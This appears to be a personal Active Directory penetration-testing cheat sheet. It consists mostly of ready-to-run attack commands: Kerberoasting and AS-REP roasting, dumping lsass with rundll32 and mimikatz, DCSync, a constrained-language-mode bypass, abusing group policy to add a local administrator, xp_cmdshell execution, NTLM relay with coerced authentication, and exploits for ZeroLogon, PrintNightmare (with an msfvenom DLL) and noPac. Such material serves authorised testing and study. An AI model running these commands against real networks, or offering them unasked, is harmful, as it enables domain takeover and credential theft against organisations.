---
title: Active Directory
date: 2022-10-21T09:30:10+08:00
tags:
  - active
  - directory
enableToc: "true"
---

This is my personal safe for arsenals. Feel free to refer and use at anytime. You can also refer to this [arsenals](arsenals) for any extra commands (`Ctrl+f` will definitely help)

**_Disclaimer: Do not use this command for illegal use. Any action you take upon the information on this repo is strictly at your own risk_**

* **[LDAP Filters as alternative](#ldap-filters)**
* **[Situational Awareness](#situational-awaress)**
	* **[Domain Enumeration](#domain-enumeration)**
		* [Forest Trust](#forest-trust)
		* [ASREP Roasting](#asrep-roasting)
		* [Kerberoasting](#kerberoasting)
		* [Unconstrained / Constrained Object](#unconstrained--constrained-object)
	* **[Constrained Language Mode](#constrained-language-mode)**
		* [CLM Enumeration](#clm-enumeration)
		* [Bypassing CLM](#bypassing-clm)
		* [Dump lsass with rundll32](#dump-lsass-process-with-signed-binary)
* **[Weak GPO Permission](#weak-gpo-permission)**
	* [Enumerate weak GPO Permission](#enumerate-weak-gpo-permission)
	* [GPO Abuse with PowerView](#gpo-abuse-with-powerview)
* **[SQL Server Enumeration and Code Execution (PowerUpSQL)](#sql-server-enumeration-and-code-execution)**
	* [Get SQL Instances](#get-sql-instances)
	* [Get SQL Linked Server](#get-sql-linked-server)
	* [Execute SQL Query and OS Command](#execute-sql-query-and-os-command)
* **[Lateral Movement / Post Exploitation](#lateral-movement--post-exploitation)**
	* [Overpass-The-Hash](#overpass-the-hash-opth)
	* [Pass-The-Certificate](#pass-the-certificate)
	* [Pass-The-CCache](#pass-the-ccache)
	* [Request TGT](#request-tgt)
	* [runas](#runas)
	* [Credential Harvesing](#credential-harvesting)
		* [DCSync](#dcsync)
* **[Remote Access](#remote-authentication-protocol)**
	* [PSRemoting](#ps-remoting)
	* [Winrs](#winrs)
	* [PsExec](#psexec)
	* [WMI](#wmi)
	* [DCOM](#dcom)
* **[Low Hanging Fruits](#low-hanging-fruits)**
	* [ZeroLogon](#zerologon)
	* [HiveNightmare](#hivenightmare)
* **[NTLMv1 Shenanigans](#ntlmv1-shenanigans)**
	* [NTLM Downgrade](#ntlm-downgrade)
	* [Relay SMB to LDAP(S)](#relay-smb-to-ldap(s))
* **[PrintNightmare](#printnightmare)**
* **[noPac](#nopac)**
* **[Relay Notes](#relay-notes)**


# LDAP Filters
| PowerView                            | Description                            | LDAP Filter                                                                                  |
| ------------------------------------ | -------------------------------------- | -------------------------------------------------------------------------------------------- |
| `Get-DomainController`               | Get current domain controller          | `(userAccountControl:1.2.840.113556.1.4.803:=8192)`                                          |
| `Get-Forest`                         | Get current forest                     | `[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()`                      |
| `Get-DomainUser`                     | Get all domain users                   | `(&(samAccountType=805306368))`                                                              |
| `Get-DomainUser -TrustedToAuth`      | Get trusted users for delegation       | `(&(samAccountType=805306368)(msds-allowedtodelegateto=*))`                                  |
| `Get-DomainUser -SPN`                | Get non-null users' SPN                | `(&(samAccountType=805306368)(servicePrincipalName=*))`                                      |
| `Get-DomainUser -PreAuthNotRequired` | Get users that disable preauth         | `(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))`          |
| `Get-DomainGroup`                    | Get all domain groups                  | `(&(objectCategory=group))`                                                                  |
| `Get-DomainGroup *admin*`            | Get specific domain group identity     | <code>(&(samAccountType>(&(samAccountType=805306368)(&#124;(samAccountName=*admin*)))</code> |
| `Get-DomainComputer`                 | Get all domain computers               | `(&(samAccountType=805306369))`                                                              |
| `Get-DomainComputer -Unconstrained`  | Get all unconstrained domain computers | `(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))`           |
| `Get-DomainGPO`                      | Get all domain GPO                     | `(&(objectCategory=groupPolicyContainer))`                                                   |

Example use:
```powershell
# Current domain context
([adsisearcher]"<ldap-filter>").FindAll()

# Other domain context
$adsiSearcherObj = [adsisearcher]""
$adsiSearcherObj.SearchRoot = [ADSI]"LDAP://DC01/DC=legitcorp,DC=local"
$adsiSearcherObj.Filter = "<ldap-filter>"
$adsiSearcherObj.FindAll()
```

>[!note]
>These LDAP filters can be used with `[adsisearcher]` builtin function in powershell. Any extra commands can be found [here](https://mlcsec.com/active-directory-domain-enumeration-part-2). Amazing cheatsheet by [@mlcsec](https://twitter.com/mlcsec)

# Situational Awareness
## Domain Enumeration
### Forest Trust
```powershell
# Map all domain trusts
Get-DomainTrustMapping -Verbose

# Get Forest Trust from current domain
Get-DomainTrust
```
### ASREP Roasting
```powershell
# PowerView
Get-DomainUser -PreauthNotRequired

# Impacket
GetNPUsers.py kiwi.local/bethany.linnell -no-pass -dc-ip 192.168.86.189
GetNPUsers.py kiwi.local/ -usersfile /tmp/users.lst -no-pass -dc-ip 192.168.86.189
```

### Kerberoasting
```powershell
# Powerview
Get-DomainUser -SPN

# Rubeus
Rubeus.exe kerberoast /nowrap
```

**Update**: A research has been done by [@exploitph](https://twitter.com/exploitph) concludes that a user that has `Not-RequirePreAuth` property enabled can perform [Kerberoasting](#kerberoasting) without needing the password of the account. Detailed explanation can be read [here](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/). 

> When a ticket is requested without pre-authentication, the result still includes an encrypted part. This encrypted part is encrypted with the credential key used for authentication and contains the session key for the ticket included within the reply. This is the encrypted data used in the [ASREPRoast attack](https://blog.harmj0y.net/activedirectory/roasting-as-reps/) by [Will Schroeder](https://twitter.com/harmj0y). The resulting TGT is usable only with access to the requesting accounts key, since the TGT session key is required. However, for Kerberoasting, access to the session key is not required. Only the resulting ST—or more accurately, the encrypted part of the ST, which is not secured with the requesting accounts key—is required. Therefore, if any account is configured to not require pre-authentication, it is possible to Kerberoast without **any** credentials.


```powershell
# Rubeus
.\Rubeus.exe kerberoast /domain:kiwi.local /dc:192.168.86.189 /nopreauth:bethany.linnel /spns:users.txt

# Impacket
GetUserSPNs.py kiwi.local/ -no-preauth bethany.linnell -usersfile /tmp/users.lst -dc-ip 192.168.86.189
```

**RoastInTheMiddle**
This attack will require you to arp spoof and wait for AS-REQ and perform kerberoast with the list provided. The tool can be found [here](https://github.com/Tw1sm/RITM).

> The POC starts four threads, a sniffer, an ARP spoofer, a re-assembler (for requests that are split across multiple packets), and the roaster. When it sees an AS-REQ, the POC starts trying to Kerberoast the supplied list, which can contain usernames or SPNs

```bash
ritm -i eth0 -t 192.168.86.184 -g 192.168.86.1 -d 192.168.86.182 -u /tmp/users.lst
```

>[!References]
>- https://www.semperis.com/blog/new-attack-paths-as-requested-sts/
>- https://github.com/Tw1sm/RITM
>-  https://twitter.com/_nwodtuhs/status/1575082377189429250?s=20&t=iS5ugj6lp5GyL6QF4jWn0Q

### Unconstrained / Constrained Object

```powershell
# unconstrained computer
Get-DomainComputer -Unconstrained -Properties name

# Constrained user/computer
Get-DomainComputer -TrustedToAuth -Properties name,msds-allowedtodelegateto
Get-DomainUser -TrustedToAuth -Properties name,msds-allowedtodelegateto
```

You can abuse these delegation permission by referring [here](#unconstrained-delegation)

## Constrained Language Mode (CLM) / WDAC / Device Guard
### CLM Enumeration
```powershell
$ExecutionContext.SessionState.LanguageMode
```
### Bypassing CLM
1. **Spawn a new FLM powershell console**
There are multiple simple ways to bypass this lockdown mechanism. One of the cool techniques is by spawning a new FLM powershell session that interacts with the `System.Management.Automation.dll` runspace directly instead of executing under powershell.exe process. This can be done with this cool repo [here](https://github.com/calebstewart/bypass-clm)

2. **Name your script to contain "System32" string**
As referred to this [article](https://www.blackhillsinfosec.com/constrained-language-mode-bypass-when-pslockdownpolicy-is-used/), Microsoft has mentioned that when applying CLM using `__PSLockdownPolicy` variable, there are ways to bypass since the system only checks if the path contains the "System32" string.
> In addition, there are also file naming conventions that enable FullLanguage mode on a script, effectively bypassing Constrained Language.

![](clm1.png)
### View AppLocker Rules
```powershell
Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections
```
### Dump lsass process with signed binary
This method will bypass CLM to dump lsass since we are using MS signed binary (whitelisted)
```powershell
# Run this in victim/remote computer
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\Windows\Tasks\lsass.dmp full

# Use pypykatz
pypykatz lsa minidump lsass.dmp

# Use mimikatz's minidump
mimikatz# sekurlsa::minidump <Path_to_file>\lsass.dmp
mimikatz# sekurlsa::logonpasswords
```

# Weak GPO Permission
### Enumerate weak GPO Permission
```powershell
# Domain wide
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs | ? {$_.activedirectoryrights -match "GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner"}}

# specific user (based on user's sid)
Get-DomainGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name | ? {$_.ActiveDirectoryRights -match "GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner" -and $_.securityidentifier -match "<userssid>"}}
```

### GPO Abuse with PowerView
```powershell
# Execute specific tasks
New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArguments 'net.exe localgroup administrators dummyuser /add' -Force

# update GPO (must run)
gpoupdate /force
```

# SQL Server Enumeration and Code Execution
I did most of my SQL Server Enumeration by using this [PowerUpSQL.ps1](https://github.com/NetSPI/PowerUpSQL) script. Refer to more commands in this [PowerUpSQL Cheatsheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
### Get SQL Instances
This method will allow you to enumerate local or domain sql servers(if any).
```powershell
# Get Local Instance
Get-SQLInstanceLocal -Verbose

# Get Domain Instance
Get-SQLInstanceDomain -Verbose
```
### Get SQL Linked Server
This command will allow you to enumerate linked sql server to selected instance. Output of the command also shows privilege that you currently have on specific sql server
```powershell
# Enumerate Linked Server (show just instace and priv)
Get-SQLServerLinkCrawl -Instance mssql-srv.contoso.local

# Enumerate Linked Server and Execute SQL Query
Get-SQLServerLinkCrawl -Instance mssql-srv.contoso.local -Query 'exec master..xp_cmdshell ''whoami'''
```
### Execute Remote SQLQuery
_Prerequisite:_
* Make sure you are **sa** user (high privileged user)
* Make sure to enable `xp_cmdshell` before executing os command
```powershell
# Enable xp_cmdshell
Get-SQLQuery -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "DB-SQLSRV"'

# Execute OS command
Get-SQLQuery -Query 'EXECUTE(''xp_cmdshell ''''whoami'''''') AT "DB-SQLSRV"'
Invoke-SQLOSCmd -Instance DB-SQLSRV -Command "whoami"
```

# Lateral Movement / Post Exploitation
### Overpass-The-Hash (OPTH)
_Note: This requires local administrator privilege_
```css
# NTLM hash
mimikatz# sekurlsa::pth /user:administrator /ntlm:<ntlm hash> /domain:CONTOSO /run:powershell.exe

# AES256 key
mimikatz# sekurlsa::pth /user:administrator /aes256:<aes256 key> /domain:CONTOSO /run:powershell.exe
```

### Pass-The-Certificate
A certificate must be obtain in order to perform this technique either through [Shadow Credentials](#shadow-credentials) or [ESC8](#esc8)
```bash
# PKINITTools
python3 gettgtpkinit.py range.net/dc01\$ -pfx-base64 $(cat /tmp/b64-cert.b64) -dc-ip 192.168.86.182 /tmp/out.ccache
```

### Pass-The-CCache
1. Request a TGT from KDC. _Note that this can be done with multiple ways, this is just one of the methods_
```bash
getTGT.py range.net/rangeadm:Password123 -dc-ip 192.168.86.182
```
2. export ccache file path to `KRB5CCNAME` environment variable.
```bash
export KRB5CCNAME=rangeadm.ccache
```
3. Authenticate with the target object. 
```bash
smbclient.py range.net/rangeadm@dc01.range.net -k -no-pass
```

### Request TGT
_Note: This will be log by the KDC_
```bash
# With plain-text
Rubeus.exe asktgt /user:administrator /password:P@$$w0rd! /domain:contoso /ptt

# With RC4 hash
Rubeus.exe asktgt /user:administraot /rc4:<rc4-hash> /domain:contoso /ptt

# Linux
getTGT.py legitcorp.local/lowpriv:'P@$$w0rd' -dc-ip 192.168.86.170
export KRB5CCNAME=lowpriv.ccache
```

### runas
This method will spawn a new process as the user. This wont validate your password, so make sure you enter it right. Slowly but surely :)
```powershell
runas /user:contoso\administrator /netonly powershell
```

### Credential Harvesting
### DCSync
```css
# Dump all available domain users
mimikatz# lsadump::dcsync /domain:fqdn /all /csv

# Dump for specific user
mimikatz# lsadump::dcsync /domain:fqdn /user:krbtgt

# Dump (if no privileged user session)
lsadump::dcsync /domain:contoso.local /dc:dc01 /user:administrator /authuser:dc01$ /authdomain:contoso.local /authpassword:"" /authntlm
```

# Remote Authentication Between Computers
### PS Remoting
**PS Remoting** stands for PowerShell remoting, this will enable users to authenticate between powershell session in remote computers by using `*-PSSession`.
```powershell
# Create New PSRemoting Session (with current user privilege/no PSCredential needed)
$sess = New-PSSession -ComputerName dc01

# Create New PS Remoting Session (with plain-text password/PSCredential needed)
$username = 'contoso\studentadmin'
$password = ConvertTo-SecureString -AsPlainText -Force 'P@$$w0rd!'
$cred = New-Object System.Management.Automation.PSCredential($username,$password)
$sess = New-PSSession -ComputerName dc01 -Credential $cred

# Get Interactive Remote Session
Enter-PSSession -ComputerName dc01
Enter-PSSession -ComputerName dc01 -Credential $cred
Enter-PSSession -Session $sess
```

### Winrs
Winrs requires a plain-text password in order to authenticate to other computers
```powershell
winrs -u:dc01.contoso.local -u:contoso\administrator -p:P@$$w0rd! "hostname"
```

### SMB 
**PsExec**
This requires you to download MS Signed Binary (`PsExec.exe`) in PsTools bundle. It can be downloaded [here](https://download.sysinternals.com/files/PSTools.zip).
```bash
# windows
PsExec.exe -accepteula \\dc01.contoso.local powershell

# linux
psexec.py legitcorp.local/Administrator@192.168.0.110
```
**SMBExec**
```bash
smbexec.py legitcorp.local/Administrator@192.168.0.110
```

### WMI
```bash
wmiexec.py legitcorp.local/Administrator@192.168.0.110
```

### DCOM
ShellBrowserWindow object can be leverage for remote code execution over DCOM. Please note that this requires authentication (e.g. runas netonly)
```powershell
PS> $com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',"192.168.112.200")
PS> $obj = [System.Activator]::CreateInstance($com)
PS> $obj.Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\system32",$null,0)
```

### Reference
* https://dolosgroup.io/blog/remote-access-cheat-sheet

# Low Hanging Fruits
### ZeroLogon
Set the computer account's password to null allowing attackers to perform [DCSync](#dcsync) attack with null authentication
1. Run exploit script [here](https://github.com/risksense/zerologon.git)
```bash
python3 set_empty_pw.py DC01 10.10.10.10
```

2. Perform DCSync with null auth
```bash
python3 secretsdump.py -just-dc -no-pass testlab/DC01\$@10.10.10.10
```

### HiveNightmare
1. Check if system is vulnerable with the following commands
```powershell
# Check if BUILTIN/Users has read permission
icacls C:\Windows\System32\config\SAM

# Check if shadow copy is available
vssadmin list shadows
```

2. Dump SYSTEM Hive with mimikatz
```css
# mimikatz (On remote computer)
mimikatz# lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM

# secretsdump.py (Local)
secretsdump.py -sam SAM-file -system SYSTEM-file LOCAL
```

Note that the above methods is the manual way. This has been implemented in a automated C# code called [HiveNightmare](https://github.com/GossiTheDog/HiveNightmare). Once you retrieve admin's ntlm, you can do lots of stuff including [changing password](https://twitter.com/gentilkiwi/status/1417467063883476992) or [Pass The Hash](#overpass-the-hash-opth)/PsExec/Evil-Winrm...

# NTLMv1 Shenanigans
### NTLM Downgrade
For below steps, it requires a specific challenge needed to be configured in `/etc/responder/Responder.conf`. Modify the challenge part to _1122334455667788_ in order to match with [crack.sh](https://crach.sh) rainbow tables.

1. Run responder with `--lm` flag. _(Note that in order to get a crackable hash for NTLMv1-SSP hash --disable-ess flag is required. Refer this tweet by [@HackAndDo](https://twitter.com/HackAndDo/status/1420135330171207685?s=20&t=0_1oqdiizE_Hbs5XKByHEw))_
```bash
responder -I eth0 --lm [--disable-ess]
```
2. Coerce authentication with your own methods (i.e. PetitPotam, DFSCoerce, PrinterBug).
```bash
python3 PetitPotam.py 192.168.86.193 192.168.86.182
```
3. A hash should appear on responder event logs. Convert the hash to a crack.sh cracking format with this [tool](https://github.com/evilmog/ntlmv1-multi). Refer steps explained in http://crack.sh/netntlm/
```bash
python3 ntlmv1.py --ntlmv1 'DC01$::RANGE:B8154B285809096F4AA9D8285846C401CDE8D2F1FBE4AC91:B8154B285809096F4AA9D8285846C401CDE8D2F1FBE4AC91:1122334455667788'
```
4. Submit hash to https://crack.sh/get-cracking and wait for the result (should be retrieved via email within seconds)

### Relay SMB to LDAP(S)
This is only possible if **NTLMv1 is enabled** but you will need to specify `--remove-mic` flag when firing up _ntlmrelayx.py_ to set `NTLMSSP_NEGOTIATE_SIGN` flag to false. Read details explanation [here](https://www.praetorian.com/blog/ntlmv1-vs-ntlmv2/)
> Relaying from SMB to the LDAP service is quite straightforward and simply requires an attacker to specify the –remove-mic flag when performing a relaying attack. Originally, this flag was added to support exploitation of the “Drop the MIC” vulnerability. However, it also has the benefit of setting the NTLMSSP_NEGOTIATE_SIGN flag to false. This allows relaying from SMB to the LDAP service to work since NTLMv1 doesn’t include a message integrity code (MIC).

1. First step is optional and 
```bash
# open socks session with ntlmrelayx.py to store SMB session on ws01 as dc01
ntlmrelayx.py -t ws01.range.net -smb2support -socks

# coerce authentication with PetitPotam.py
python3 PetitPotam.py 192.168.86.193(attacker) dc01.range.net
```
2. Now you should have socks SMB session on ws01$ as dc01$. Execute ntlmrelayx.py `stopservers` command to stop other listening ports as we no longer need them.
3. Fire up `ntlmrelayx.py` with `--remove-mic` flag targeting ldap service on dc01. _Note that the -i flag is to open an interactive ldap session_
```bash
ntlmrelayx.py -t ldap://dc01.range.net -smb2support --remove-mic -i
```
4. Use printerbug.py script to coerce spooler service as WS01$. _You can either use either a plain-text password, kerberos auth or socks session opened earlier in step1_
```bash
# password auth
python3 printerbug.py range.net/rangeadm:Password123@ws01.range.net "192.168.86.193" -no-ping -no-pass

# ntlmrelayx.py socks session
proxychains python3 printerbug.py RANGE/DC01\$@ws01.range.net "192.168.86.193" -no-ping -no-pass
```
5. Now ntlmrelayx.py should be showing a successful relaying attempt to ldap service like the following
```bash
[[..snip..]]
[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.86.184, attacking target ldap://dc01.range.net
[*] Authenticating against ldap://dc01.range.net as RANGE/WS01$ SUCCEED
[*] Started interactive Ldap shell via TCP on 127.0.0.1:11000
[[..snip..]]
```
6. You can interact with the LDAP interactive shell by using `nc` or `telnet` to port 11000 (default)
7. In this scenario, we can abuse so many ldap feature. One of the infamous POC is abusing RBCD. Lets first create a controlled computer account using `addcomputer.py` impacket script.
```bash
addcomputer.py range.net/lowpriv:Password1234 -computer-name evilpc -computer-pass Password1234
```
8. Use the LDAP shell _set_rbcd_  to set WS01$ `msds-allowedtoactonbehalfofotheridentity` to our controlled computer evilpc$
9. Make s4u request to get a service ticket as the impersonated account
```bash
getST.py range.net/lowpc2\$:Password123 -spn http/ws01.range.net -impersonate Administrator -dc-ip 192.168.86.182
```
10. Now try wmiexec into WS01$ and win
```bash
wmiexec.py range.net/Administrator@ws01.range.net -no-pass -k
```

>[!References]
>- https://www.praetorian.com/blog/ntlmv1-vs-ntlmv2/
>- https://twitter.com/an0n_r0/status/1571598587439775745?s=20&t=q3-YgJ7LcZATARKd0JnlKQ
>- https://www.trustedsec.com/blog/practical-attacks-against-ntlmv1/?utm_content=221361665&utm_medium=social&utm_source=twitter&hss_channel=tw-403811306

# PrintNightmare
Abusing printer spooler service (CVE-2021-34527) to load malicious DLL and execute as SYSTEM. Available POCs can be found here

| Link          | Authors         |Language|
| ------------- | ------------- | ----- |
| https://github.com/cube0x0/CVE-2021-1675      | [@cube0x0](https://twitter.com/cube0x0) | python, c# |
| https://github.com/calebstewart/CVE-2021-1675      | [@calebsteward](https://twitter.com/calebjstewart)      |  PowerShell |

1. Generate `msfvenom` payload
```bash
msfvenom -p windows/x64/exec CMD="net.exe localgroup administrators testuser /add" -f dll -o test.dll
```

2. Run these commands _(either one)_
```powershell
# Powershell
Import-Module .\cve-2021-1675.ps1
Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"

# SharpPrintNightMare
SharpPrintNightmare.exe C:\Windows\Tasks\execme.dll

# Python Impacket Implementation
## setup smbserver
smbserver.py smbshare `pwd` -smb2support
python3 CVE-2021-1675.py testlab/testuser:'P@$$w0rd!'@10.10.10.10 '\\10.10.10.10\smbshare\encme.dll' [-hashes :NTLM]
```

# noPac
This exploit will require a valid domain user regardless the level of privilege given as long as it can create a computer account on the domain. Here are the steps.

1. Create a fake computer with [Powermad.ps1](https://github.com/Kevin-Robertson/Powermad) script.
```powershell
New-MachineAccount -MachineAccount "FakeComputer" -Password $password -Domain legitcorp.local -DomainController DC01.legitcorp.local -Verbose
```

2. Clear the fake computer's ServicePrincipalName (SPN) value
```powershell
Set-DomainObject "CN=FakeComputer,CN=Computers,DC=legitcorp,DC=local" -Clear "serviceprincipalname" -Verbose -Domain legitcorp.local
```

3. Rename the fake computer samaccountname to domain controller name (FakeComputer$ -> DC01)
```powershell
Set-MachineAccountAttribute -MachineAccount "FakeComputer" -Value "DC01" -Attribute samaccountname -Domain legitcorp.local -Verbose
```

4. Request a TGT of the domain controller
```powershell
Rubeus.exe asktgt /user:DC01 /password:Password2 /domain:legitcorp.local /dc:DC01.legitcorp.local /nowrap
```

5. Rename the fake computer name to its original name (DC01 -> FakeComputer$)
```powershell
Set-MachineAccountAttribute -MachineAccount "FakeComputer" -Value "FakeComputer" -Attribute samaccountname -Verbose -Domain legitcorp.local
```

6. Request TGS on behalf of the domain controller ticket we obtained previously.
```powershell
Rubeus.exe s4u /impersonateuser:DC01$ /nowrap /dc:DC01.legitcorp.local /self /altservice:ldap/DC01.legitcorp.local /ptt /ticket:<base64-blob-ticket>
```

7. Perform cleanup (OPSEC Friendly)
```powershell
Remove-MachineAccount -Domain legitcorp.local -MachineAccount FakeComputer
```

### Automated Exploit
There are a few automated scripts and tools out there to perform this exploit. This are some of the tools that i use previously on an engagement.
* Python (https://github.com/Ridter/noPac.git)
```bash
python3.exe .\noPac.py domain.local/lowpriv:Passw0rd -dc-ip 10.0.10.10 -dc-host DC01 --impersonate administrator -dump
```

* CSharp (https://github.com/cube0x0/noPac.git)
```powershell
noPac.exe -domain domain.local -user low_priv -pass 'P@ssw0rd' /dc dc01.domain.local /mAccount FakeComputer /service [ldap,cifs,http] /ptt
```

Note: _Always perform cleanup if you are exploiting this against the corporate environment. You can use the following command to verify and remove a computer account_
```powershell
# verify computer account with wmic
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname

# remove a computer account
net computer \\FakeComputer /delete
```


### Reference 
https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing

# References
* https://www.harmj0y.net/
* https://www.labofapenetrationtester.com/
* https://ired.team
* https://github.com/GhostPack/Rubeus
* https://github.com/gentilkiwi/mimikatz/wiki
